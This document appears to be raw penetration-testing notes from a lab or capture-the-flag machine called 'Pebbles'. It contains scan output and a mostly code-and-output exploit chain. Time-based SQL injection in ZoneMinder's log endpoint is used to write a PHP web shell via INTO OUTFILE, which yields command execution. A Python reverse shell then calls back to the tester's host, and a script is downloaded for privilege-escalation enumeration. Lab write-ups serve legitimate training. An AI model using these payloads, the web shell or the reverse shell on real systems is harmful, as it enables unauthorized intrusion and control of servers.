Nmap

```
# Nmap 7.92 scan initiated Tue Jan 18 20:27:49 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/autorecon/results/192.168.151.52/scans/_full_tcp_nmap.txt -oX /root/autorecon/results/192.168.151.52/scans/xml/_full_tcp_nmap.xml 192.168.151.52
adjust_timeouts2: packet supposedly had rtt of -81226 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -81226 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -81750 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -81750 microseconds.  Ignoring time.
Nmap scan report for 192.168.151.52
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-18 20:27:51 +08 for 370s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTlsFY1sjAxyC1lqlzeHAaSC0ec76cB5Hoq6aVwMNphXzrhslKqJJ5L0sjOjQem02G6wukOQ/qIVzUZOPxdn4tlN+YuCRqrE7nSIj36hh6JeG4cI9t3qOJUPndLKuKSyJKwV1Dl7gQKcjS0gxO6kWybHMf4CT9a8QsF8mLDPNU3p5VfsEdrgJ+q5hNOmLYJPqwIHTdCweuSwaORn9wQGlmKphGZJlktEKEPwecDZO5KUc6g3N23G+vWv2uCmAw9ov8AQrePxdjz5/QQ8PdY6zedwcLUFjmL5jx9UhZLhDDf/pzP0wiswgm7DZXG6WHwMCbxNo0zX4/HFDswDHc/W+J
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOrgGvGclvZKKtoTk+H0ojQxTTSKljSVFLY8udD6Cb8OQLjgd5F48Em8sa7JjoCa4Mn3USw7EttQLL9a1RNEgio=
|   256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBSm8eCxMlgt56SQ1z3TjY8R0ZY2MMMlYTB4Bby39xXE
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tomcat
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.2.0 (90%), Linux 3.16 (89%), Linux 3.13 (87%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 4.11 (85%), Linux 3.12 (85%), Linux 3.13 or 4.2 (85%), Linux 3.16 - 4.6 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/18%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E6B3B9%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=107%TI=Z%TS=8)
SEQ(SP=107%GCD=1%ISR=107%TI=Z%II=I%TS=8)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.015 days (since Tue Jan 18 20:11:49 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   170.68 ms 192.168.49.1
2   170.72 ms 192.168.151.52

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 18 20:34:01 2022 -- 1 IP address (1 host up) scanned in 372.06 seconds
```

feroxbuster reveals /zm

```
403        9l       28w      281c http://192.168.151.52:8080/server-status
301        9l       28w      320c http://192.168.151.52:8080/zm
403        9l       28w      281c http://192.168.151.52:8080/.php
403        9l       28w      281c http://192.168.151.52:8080/.html
```


Sql

```
┌──(kali㉿localhost)-[/tmp]
└─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434'
{"result":"Ok","updated":"Wed 19th Jan, 12:34am","total":"3","available":"3","logs":[{"TimeKey":"1642570315.081850","Component":"zmaudit","ServerId":null,"Pid":"1340","Level":"0","Code":"INF","Message":"Deleted 93 log table entries by time","File":"zmaudit.pl","Line":null,"DateTime":"2022-01-19 00:31:55.081850","Server":""},{"TimeKey":"1642570056.165297","Component":"web_js","ServerId":null,"Pid":"1875","Level":"-2","Code":"ERR","Message":"Uncaught TypeError: Cannot read properties of null (reading 'focus')","File":"http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","Line":"117","DateTime":"2022-01-19 00:27:36.165297","Server":""},{"TimeKey":"1642569691.158873","Component":"web_js","ServerId":null,"Pid":"1851","Level":"-2","Code":"ERR","Message":"Uncaught TypeError: Cannot read properties of null (reading 'focus')","File":"http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","Line":"117","DateTime":"2022-01-19 00:21:31.158873","Server":""}],"state":"alert","options":{"Component":["web_js","zmaudit"],"Pid":["1340","1851","1875"],"Level":{"-2":"ERR","0":"INF"},"File":["http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["117"]}}
real    0m5.528s
user    0m0.009s
sys     0m0.020s

┌──(kali㉿localhost)-[/tmp]
└─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(10)))OQkj)#&minTime=1466674406.084434'
{"result":"Ok","updated":"Wed 19th Jan, 12:38am","total":"3","available":"3","logs":[{"TimeKey":"1642570315.081850","Component":"zmaudit","ServerId":null,"Pid":"1340","Level":"0","Code":"INF","Message":"Deleted 93 log table entries by time","File":"zmaudit.pl","Line":null,"DateTime":"2022-01-19 00:31:55.081850","Server":""},{"TimeKey":"1642570056.165297","Component":"web_js","ServerId":null,"Pid":"1875","Level":"-2","Code":"ERR","Message":"Uncaught TypeError: Cannot read properties of null (reading 'focus')","File":"http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","Line":"117","DateTime":"2022-01-19 00:27:36.165297","Server":""},{"TimeKey":"1642569691.158873","Component":"web_js","ServerId":null,"Pid":"1851","Level":"-2","Code":"ERR","Message":"Uncaught TypeError: Cannot read properties of null (reading 'focus')","File":"http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","Line":"117","DateTime":"2022-01-19 00:21:31.158873","Server":""}],"state":"alert","options":{"Component":["web_js","zmaudit"],"Pid":["1340","1851","1875"],"Level":{"-2":"ERR","0":"INF"},"File":["http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["117"]}}
real    0m10.492s
user    0m0.009s
sys     0m0.018s

┌──(kali㉿localhost)-[/tmp]
└─$ 
```

https://zoneminder.readthedocs.io/en/stable/

```
real    0m16.062s                                                                       user    0m0.018s                                                                        sys     0m0.035s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT SLEEP(10));(SELECT SLEEP(5))#&minTime=1466674406.084434' | tail
```

```
,1807,1807#'","File":"\/usr\/share\/zoneminder\/www\/includes\/database.php","Line":"115","DateTime":"2022-01-19 01:08:09.404166","Server":""},{"TimeKey":"1642572489.174376","Component":"web_php","ServerId":null,"Pid":"1981","Level":"-3","Code":"FAT","Message":"SQL-ERR 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-2079 UNION ALL SELECT 4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,46' at line 1', statement was 'SELECT * FROM Logs WHERE TimeKey > ? order by TimeKey desc limit -2079 UNION ALL SELECT 4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632,4632#'","File":"\/usr\/share\/zoneminder\/www\/includes\/database.php","Line":"115","DateTime":"2022-01-19 01:08:09.174376","Server":""}],"state":"ok","options":{"Component":["web_js","web_php","zmaudit"],"Pid":["1340","1851","1875","1969","1977","1980","1981","1985","1987","2006"],"Level":{"-3":"FAT","-2":"ERR","0":"INF"},"File":["\/usr\/share\/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}   real    0m6.114s                                                                        user    0m0.004s                                                                        sys     0m0.063s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "<?php system(\$_GET['cmd']); ?>");(SELECT SLEEP(5))#&minTime=1466674406.084434' | tail 
```


```
┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "<?php system($_GET[\\"cmd\\"]); ?>"  INTO OUTFILE '/tmp/cmd.php');(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                             % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 94233    0 94069  100   164  91774    160  0:00:01  0:00:01 --:--:-- 92024          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m1.057s                                                                        user    0m0.003s                                                                        sys     0m0.033s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ 
```


File write works?

```
┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT * FROM Users INTO OUTFILE "/tmp/users");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                                        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 94208    0 94069  100   139  15788     23  0:00:06  0:00:05  0:00:01 25085          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m5.998s                                                                        user    0m0.011s                                                                        sys     0m0.034s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT * FROM Users INTO OUTFILE "users");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                                             % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 94203    0 94069  100   134  15696     22  0:00:06  0:00:05  0:00:01 19638          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m6.024s                                                                        user    0m0.021s                                                                        sys     0m0.018s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$
```


Alright file write
```
┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT * FROM Users INTO OUTFILE "/var/www/html/users");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                               % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 94217    0 94069  100   148  15680     24  0:00:06  0:00:05  0:00:01 19683          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m6.032s                                                                        user    0m0.019s                                                                        sys     0m0.020s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$
┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/users
1       admin   *4ACFE3202A5FF5CF467898FC58AAB1D615029441               1       View   Edit     Edit    Edit    Edit    Edit    Edit

┌──(kali㉿localhost)-[/tmp]
└─$ 
```

Better file write

```
┌──(kali㉿localhost)-[/tmp]                                                             └─$ DATA=hi                                                                                                                                                                     ┌──(kali㉿localhost)-[/tmp]                                                             └─$ FILE=test.txt                                                                                                                                                               ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "'$DATA'" FROM Users INTO OUTFILE "/var/www/html/'$FILE'");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 93792    0 93638  100   154  15085     24  0:00:06  0:00:06 --:--:-- 23438          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m6.246s                                                                        user    0m0.021s                                                                        sys     0m0.024s 
┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/test.txt
hi
┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/test.txt
```

# RCE

```
┌──(kali㉿localhost)-[/tmp]                                                             └─$ DATA=$(urlencode "<?php system(\$_GET['cmd']); ?>")                                                                                                                         ┌──(kali㉿localhost)-[/tmp]                                                             └─$ echo $DATA                                                                          %3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E                                                                                                                      ┌──(kali㉿localhost)-[/tmp]                                                             └─$ FILE=cmd.txtt                                                                                                                                                               ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "'$DATA'" FROM Users INTO OUTFILE "/var/www/html/'$FILE'");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 93848    0 93638  100   210  15056     33  0:00:06  0:00:06 --:--:-- 23374          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m6.254s                                                                        user    0m0.027s                                                                        sys     0m0.009s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ FILE=rce.php                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$ time curl http://192.168.58.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "'$DATA'" FROM Users INTO OUTFILE "/var/www/html/'$FILE'");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200                                     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed           100 93847    0 93638  100   209  15154     33  0:00:06  0:00:06 --:--:-- 23604          \/zoneminder\/www\/includes\/database.php","http:\/\/192.168.58.52\/zm\/skins\/classic\/js\/skin.js","http:\/\/192.168.58.52:8080\/zm\/skins\/classic\/js\/skin.js","zmaudit.pl"],"Line":["115","117"]}}                                                                real    0m6.211s                                                                        user    0m0.017s                                                                        sys     0m0.018s                                                                                                                                                                ┌──(kali㉿localhost)-[/tmp]                                                             └─$
┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/cmd.txtt
<?php system($_GET['cmd']); ?>

┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/rce.php?cmd=$(urlencode whoami)
www-data

┌──(kali㉿localhost)-[/tmp]
└─$ 

┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/rce.php?cmd=$(urlencode ls /usr/bin ) | grep python
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7076  100  7076    0     0  17645      0 --:--:-- --dh_python3
100  7076  100  7076    0     0  17645      0 --:--:-- --:--:-- --:--:-- 17645
python3
python3.5
python3.5m
python3m

┌──(kali㉿localhost)-[/tmp]
└─$
```


```
┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/rce.php?cmd=$(urlencode "ls -alR /home/")
/home/:
total 12
drwxr-xr-x  3 root  root  4096 Jun 22  2020 .
drwxr-xr-x 23 root  root  4096 Jun 22  2020 ..
drwxr-xr-x  3 sally sally 4096 Jun 24  2020 sally

/home/sally:
total 24
drwxr-xr-x 3 sally sally 4096 Jun 24  2020 .
drwxr-xr-x 3 root  root  4096 Jun 22  2020 ..
-rw------- 1 sally sally    0 Jul 20  2020 .bash_history
-rw-r--r-- 1 sally sally  220 Jun 22  2020 .bash_logout
-rw-r--r-- 1 sally sally 3771 Jun 22  2020 .bashrc
drwx------ 2 sally sally 4096 Jun 24  2020 .cache
-rw-r--r-- 1 sally sally  675 Jun 22  2020 .profile
-rw-r--r-- 1 sally sally    0 Jun 22  2020 .sudo_as_admin_successful

┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/rce.php?cmd=$(urlencode "find local.txt")

┌──(kali㉿localhost)-[/tmp]
└─$ curl http://192.168.58.52:3305/rce.php?cmd=$(urlencode "ls /")
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

┌──(kali㉿localhost)-[/tmp]
└─$ 
```

# RCE commands

```
IP=192.168.58.52

DATA=$(urlencode "<?php system(\$_GET['cmd']); ?>") 

FILE=rce.php

time curl http://$IP/zm/index.php --data 'view=request&request=log&task=query&limit=100;(SELECT "'$DATA'" FROM Users INTO OUTFILE "/var/www/html/'$FILE'");(SELECT SLEEP(5));#&minTime=1466674406.084434' | tail -c 200 

curl http://$IP:3305/rce.php?cmd=$(urlencode whoami)
```

# Reverse shell testing 

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                └─# curl "http://$IP:3305/rce.php?cmd=$(urlencode 'ls /r 2>&1')"
ls: cannot access '/r': No such file or directory 
```

Network testing

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─# curl "http://$IP:3305/rce.php?cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.%20168.49.58%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'$(urlencode ' 2>&1')"                                             
Traceback (most recent call last):
  File "<string>", line 1, in <module>                                                  socket.gaierror: [Errno -3] Temporary failure in name resolution
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─# curl "http://$IP:3305/rce.php?cmd=$(urlencode 'ping -c 2 1o2.168.49.58 2>&1')"      ping: unknown host 1o2.168.49.58                                                        ┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                └─# curl "http://$IP:3305/rce.php?cmd=$(urlencode 'ping -c 2 192.168.49.58 2>&1')"      PING 192.168.49.58 (192.168.49.58) 56(84) bytes of data.                                64 bytes from 192.168.49.58: icmp_seq=1 ttl=63 time=170 ms
64 bytes from 192.168.49.58: icmp_seq=2 ttl=63 time=169 ms                                                                                                                      --- 192.168.49.58 ping statistics ---                                                   2 packets transmitted, 2 received, 0% packet loss, time 1000ms                          rtt min/avg/max/mdev = 169.956/170.460/170.965/0.651 ms
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                └─# 
```

Port test

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                
└─# curl "http://$IP:3305/rce.php?cmd=$(urlencode 'wget 192.168.49.58')"                
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                
└─#
```

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon/results/192.168.151.52-Pebbles/scans/tcp80]     └─# sudo python3 -m http.server 80                                                      Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                192.168.58.52 - - [19/Jan/2022 15:24:13] "GET / HTTP/1.1" 200 - 
```

Port 4444 doesn't really work

## Reverse Shell

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─# curl "http://$IP:3305/rce.php?cmd=echo%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.%20168.49.58%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'$(urlencode ' 2>&1')"                                                -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192. 168.49.58",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")                                                ┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                └─# curl "http://$IP:3305/rce.php?cmd=echo%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.58%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'$(urlencode ' 2>&1')"                                                   -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.58",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─# curl "http://$IP:3305/rce.php?cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.58%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'$(urlencode ' 2>&1')" 
```

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon/results/192.168.151.52-Pebbles/scans/tcp80]     
└─# nc -nlvp 80                                                                         Listening on 0.0.0.0 80                                                                 Connection received on 192.168.58.52 39348                                              www-data@pebbles:/var/www/html$ 
```

# Privesc

```
www-data@pebbles:/var/www/html$ ls
ls                                                                                      cmd.php  index.html  rce.php                                                            www-data@pebbles:/var/www/html$ cd /home                                                cd /home                                                                                www-data@pebbles:/home$ ls                                                              ls
sally
www-data@pebbles:/home$ cd sally                                                        cd sally                                                                                www-data@pebbles:/home/sally$ ls                                                        ls                                                                                      www-data@pebbles:/home/sally$ ls -al                                                    ls -al                                                                                  total 24                                                                                drwxr-xr-x 3 sally sally 4096 Jun 24  2020 .
drwxr-xr-x 3 root  root  4096 Jun 22  2020 ..
-rw------- 1 sally sally    0 Jul 20  2020 .bash_history                                -rw-r--r-- 1 sally sally  220 Jun 22  2020 .bash_logout
-rw-r--r-- 1 sally sally 3771 Jun 22  2020 .bashrc
drwx------ 2 sally sally 4096 Jun 24  2020 .cache                                       -rw-r--r-- 1 sally sally  675 Jun 22  2020 .profile                                     -rw-r--r-- 1 sally sally    0 Jun 22  2020 .sudo_as_admin_successful                    www-data@pebbles:/home/sally$ find / -name local.txt 2>/dev/null                        find / -name local.txt 2>/dev/null                                                      www-data@pebbles:/home/sally$ 
```

## lse

```
www-data@pebbles:/home/sally$ cd /tmp                                                   cd /tmp
www-data@pebbles:/tmp$ wget 192.168.49.58:8080/lse.sh
wget 192.168.49.58:8080/lse.sh
--2022-01-19 02:31:33--  http://192.168.49.58:8080/lse.sh
Connecting to 192.168.49.58:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: 'lse.sh'
                                                                                        lse.sh              100%[===================>]  42.55K   121KB/s    in 0.4s                                                                                                     2022-01-19 02:31:34 (121 KB/s) - 'lse.sh' saved [43570/43570]                           
www-data@pebbles:/tmp$ chmod +x lse.sh                                                  chmod +x lse.sh                                                                         www-data@pebbles:/tmp$ 
```

# Privesc

```
www-data@pebbles:/$ ps aux | cat                                                        ps aux | cat                                                                            USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                root         1  0.0  0.5  37556  5576 ?        Ss   02:13   0:01 /sbin/init             root         2  0.0  0.0      0     0 ?        S    02:13   0:00 [kthreadd]             root         3  0.0  0.0      0     0 ?        S    02:13   0:00 [ksoftirqd/0]          root         5  0.0  0.0      0     0 ?        S<   02:13   0:00 [kworker/0:0H]         root         7  0.0  0.0      0     0 ?        S    02:13   0:00 [rcu_sched]            root         8  0.0  0.0      0     0 ?        S    02:13   0:00 [rcu_bh]               root         9  0.0  0.0      0     0 ?        S    02:13   0:00 [migration/0]          root        10  0.0  0.0      0     0 ?        S    02:13   0:00 [watchdog/0]           root        11  0.0  0.0      0     0 ?        S    02:13   0:00 [kdevtmpfs]            root        12  0.0  0.0      0     0 ?        S<   02:13   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   02:13   0:00 [perf]                 root        14  0.0  0.0      0     0 ?        S    02:13   0:00 [khungtaskd] 

... 

root      1009  0.0 18.9 1153664 192444 ?      Ssl  02:13   0:02 /usr/sbin/mysqld
root      1012  0.0  0.2  24044  2304 ?        Ss   02:13   0:00 /usr/sbin/vsftpd /etc/v
sftpd.conf
root      1033  0.0  0.1  15932  1596 tty1     Ss+  02:13   0:00 /sbin/agetty --noclear
tty1 linux
root      1040  0.0  1.9 174620 19424 ?        Ssl  02:13   0:00 /usr/bin/python3 /usr/s
hare/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1073  0.0  0.5 277084  5816 ?        Ssl  02:13   0:00 /usr/lib/policykit-1/po
lkitd --no-debug
root      1098  0.0  0.0  13368   140 ?        Ss   02:13   0:00 /sbin/mdadm --monitor -
-pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog

... 

```


Database enum

Mysql is running as root, as proven by permissions of rce.php file

```
www-data@pebbles:/var/www/html$ ls -al
ls -al
total 28
drwxr-xr-x 2 root root  4096 Jan 19 02:18 .                                             drwxr-xr-x 5 root root  4096 Jun 23  2020 ..
-rw-rw-rw- 1 root root    31 Jan 19 02:17 cmd.php
-rw-r--r-- 1 root root 11321 Jun 22  2020 index.html                                    -rw-rw-rw- 1 root root    31 Jan 19 02:18 rce.php
www-data@pebbles:/var/www/html$ cd ..
cd ..                                                                                   www-data@pebbles:/var/www$ ls
ls
auth  html  tomcat
www-data@pebbles:/var/www$ cd auth
cd auth
www-data@pebbles:/var/www/auth$ ls                                                      ls                                                                                      css  images  index.php                                                                  www-data@pebbles:/var/www/auth$ 
```

/usr/share/zoneminder/includes/database.php


```
www-data@pebbles:/var/www/tomcat$ # from testing sql previously                         # from testing sql previously                                                           www-data@pebbles:/var/www/tomcat$ cd /usr/share/zoneminder/www
